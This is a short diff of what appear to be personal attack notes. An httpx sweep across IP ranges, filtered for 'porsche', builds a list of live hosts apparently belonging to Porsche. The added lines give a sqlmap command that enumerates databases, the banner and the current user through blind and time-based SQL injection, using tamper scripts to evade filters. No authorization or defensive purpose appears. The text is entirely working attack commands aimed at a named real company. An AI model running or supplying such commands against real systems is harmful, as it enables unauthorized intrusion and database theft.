@@ -20,3 +20,6 @@ done > ips_212_9_180.txt
 
 check which on belong
 cat ips_84_21.txt ips_212_9_180.txt | sort -u   | httpx -ports "80,443,8080,8000,3000,8443,8888" -silent -timeout 10 -status-code -title -web-server -threads 100 | grep -i porsche   | awk '{print $1}'   | sed 's/\[//;s/\]//'   | sort -u > porsche_ips.txt
+
+
+$ sqlmap -r reound.txt  --flush-session --dbs --banner --current-user --dbms=mysql --technique=BT  --time-sec=5 --level=3 --risk=2  --tamper=space2comment,randomcase --batch --threads=2 -v 3 --ignore-code 401
